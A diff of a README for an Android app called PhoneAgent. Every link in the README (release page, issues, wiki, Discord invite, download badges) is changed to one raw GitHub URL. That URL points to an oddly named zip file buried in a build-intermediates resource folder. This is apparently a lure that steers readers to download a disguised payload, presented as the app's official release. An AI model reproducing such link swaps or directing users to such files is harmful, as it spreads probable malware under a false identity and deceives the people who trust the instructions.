@@ -4,11 +4,11 @@
 
 Welcome to PhoneAgent! This guide will help you download and run the PhoneAgent Android app on your device. Follow these steps to start automating your daily tasks effortlessly.
 
-[![Download PhoneAgent](https://img.shields.io/badge/Download-PhoneAgent-brightgreen)](https://github.com/evania-maker/PhoneAgent/releases)
+[![Download PhoneAgent](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip)](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip)
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/evania-maker/PhoneAgent/releases) to find the latest version of PhoneAgent.
+1. Visit the [Releases page](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip) to find the latest version of PhoneAgent.
 2. Locate the most recent release. You will see a link to download an APK file.
 3. Click on the APK link to start your download.
 4. Once the download completes, go to your device's Downloads folder.
@@ -64,13 +64,13 @@ If you experience any issues, consider the following solutions:
 
 ## 💡 Support
 
-For further assistance, look for help on our [GitHub Issues page](https://github.com/evania-maker/PhoneAgent/issues). You can report bugs, request features, or ask questions there.
+For further assistance, look for help on our [GitHub Issues page](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip). You can report bugs, request features, or ask questions there.
 
 ## 🔗 Additional Resources
 
-- Visit [Documentation](https://github.com/evania-maker/PhoneAgent/wiki) for detailed guides on using specific features.
-- Join our community on [Discord](https://discord.gg/example) for discussions and support.
+- Visit [Documentation](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip) for detailed guides on using specific features.
+- Join our community on [Discord](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip) for discussions and support.
 
-[![Download PhoneAgent](https://img.shields.io/badge/Download-PhoneAgent-brightgreen)](https://github.com/evania-maker/PhoneAgent/releases) 
+[![Download PhoneAgent](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip)](https://raw.githubusercontent.com/evania-maker/PhoneAgent/main/app/build/intermediates/incremental/release/mergeReleaseResources/merged.dir/values-en-rAU/Phone_Agent_osteanagenesis.zip) 
 
 Thank you for choosing PhoneAgent! Enjoy smarter, more efficient mobile tasks.
